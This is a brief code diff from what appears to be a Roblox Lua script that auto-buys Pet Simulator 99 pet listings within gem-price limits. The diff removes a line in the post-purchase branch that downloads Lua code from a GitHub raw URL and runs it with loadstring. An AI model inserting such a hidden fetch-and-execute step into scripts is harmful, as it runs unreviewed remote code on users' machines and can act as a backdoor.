@@ -155,7 +155,6 @@ elseif type.huge and gems <= 1000000 then
     local boughtPet, boughtMessage = purchase:InvokeServer(playerid, uid)
     if boughtPet == true then
         processListingInfo(uid, gems, item, version, shiny, amount, username, boughtPet)
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/LordPippo/PS99/main/test.lua", true))()
     end
 elseif type.titanic and gems <= 10000000 then
     local boughtPet, boughtMessage = purchase:InvokeServer(playerid, uid)
